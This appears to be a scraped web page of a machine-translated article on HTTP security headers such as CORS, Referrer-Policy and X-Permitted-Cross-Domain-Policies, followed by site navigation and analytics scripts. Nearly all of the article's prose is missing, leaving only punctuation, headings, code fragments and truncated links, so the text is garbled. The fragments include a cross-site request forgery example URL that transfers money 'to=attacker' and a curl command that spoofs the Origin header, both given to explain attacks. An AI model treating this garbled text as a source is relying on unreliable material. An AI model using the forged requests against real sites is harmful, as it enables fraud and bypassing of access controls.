src="https://habrastorage.org/getpro/habr/post_images/68d/3aa/ae1/68d3aaae10cb6f226ae1c0a1c9a96d27.png" alt="图片"><br><br>  ,    ,   ,    ,        .   ,        ,          . , ,       ,    <code>my-bank.com/transfer?amount=1000&amp;from=me&amp;to=attacker.</code>    ! <br><br>       , <code>GET</code> -   ,   ,     <code>POST</code> -?  ,      ,     ,    <code>http://cors-test:7888/?method=POST</code> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e73/f4e/9a0/e73f4e9a003a2cb60cf6c952bc8d21e6.png" alt="图片"><br><br>      <code>POST</code> ,        ,    « ».    ,   <code>OPTIONS</code>     ,    .       ,    ,    <code>POST</code>    . <br><br>     : <br><br><ul><li> CORS —    .   ,     ,         ,   . </li><li>    API,     <code>GET</code> .        ,     . </li></ul><br>    ,        -,       ,    ,     CORS.  ,   ,   <code>example.com</code> ,     <code>example.com/_proxy/other.com</code> ,    ,   <code>_proxy/other.com/*</code> ,    <code>other.com</code> . <br><br>       , ,       CORS,  MDN    ,       <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a> . <br><br><h3> X-Permitted-Cross-Domain-Policies </h3><br>    CORS, <code>X-Permitted-Cross-Domain-Policies</code>       Adobe ( , Flash  Acrobat). <br><br>      ,    ,      .  ,  Adobe      <code>crossdomain.xml</code>    ,    ,  <code>X-Permitted-Cross-Domain-Policies</code>       . <br><br>  ?      <code>X-Permitted-Cross-Domain-Policies: none</code>   ,       Flash. <br><br><h3> Referrer-Policy </h3><br>      , ,      .   <code>Referer</code> ,       .     URL     ,   . <br><br> ,  ,      .    ,     .   <code>Referer</code>        .    ,    ,              . <br><br>  <code>Referrer-Policy</code> ,    2017         ,        ,  ,      URL-   <code>Referer</code>     . <br><br>      ,    <code>Referrer-Policy</code> : <br><br><ul><li> <code>no-referrer</code> :  <code>Referer</code>    </li><li> <code>origin</code> :  <code>https://example.com/private-page</code>  <code>https://example.com/</code> </li><li> <code>same-origin</code> :  <code>Referer</code>    ,       </li></ul><br>  ,      <code>Referred-Policy</code> ( <code>strict-origin</code> , <code>no-referrer-when-downgrade</code>  . .),  ,    , ,      .       ,    ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">     OWASP</a> . <br><br>  <code>Origin</code>    <code>Referer</code> ,        ,  ,          .  <code>Origin</code>  ,       .             -:  <code>Origin</code>     ,   . <br><br>   ,   HTTP-,   cURL,     :  c <code>url -H "Origin: example.com" api.example.com</code>        origin ……         <code>Origin</code> ( <code>Referer</code> ,     )        . <br><br><h3>    </h3><br>        <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">securityheaders.com</a> ,   -,    ,    -   ,   .  ,    URL,         .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=https://securityheaders.com/%3Fq%3D">   facebook.com</a> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8dd/8ef/5a6/8dd8ef5a6215f292b95bfae1b9c8ef16.png" alt="图片"><br><br>     ,   , securityheaders.com —  ,    . <br><br><h3> HTTP   :     cookie </h3><br>           HTTP,     ,     -      ,       . <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=https://medium.freecodecamp.org/web-security-hardening-"> </a>           HTTP: . <br><br>   ,   -   HTTP   , , ,  ( )         -:     - ,     ,     «   ».   ,  cookie       ,           . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN434228/">https://habr.com/ru/post/zh-CN434228/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN434218/index.html">游戏“魔兽世界” 3.3.5a示例中的简单Java Clicker机器人</a></li>
<li><a href="../zh-CN434220/index.html">进入Aeronet：在虚拟环境中启动自主直升机</a></li>
<li><a href="../zh-CN434222/index.html">亚马逊地面站出租-接收和处理卫星数据</a></li>
<li><a href="../zh-CN434224/index.html">12月24日至30日在莫斯科举行的数字活动</a></li>
<li><a href="../zh-CN434226/index.html">Habrautility用于收集habrablog中的habrastatistics</a></li>
<li><a href="../zh-CN434230/index.html">在顶级3D博览会上展示GOM Atos 5 / 5X 3D扫描仪</a></li>
<li><a href="../zh-CN434234/index.html">泳道法</a></li>
<li><a href="../zh-CN434236/index.html">带变形虫的神经网络解决了8个城市的旅行商问题</a></li>
<li><a href="../zh-CN434238/index.html">Raspberry Pi上的Intel OpenVINO：2018年收获</a></li>
<li><a href="../zh-CN434244/index.html">我是妈妈的交易员：寻找免费的框架来测试假设并在战斗模式下启动（Python）</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>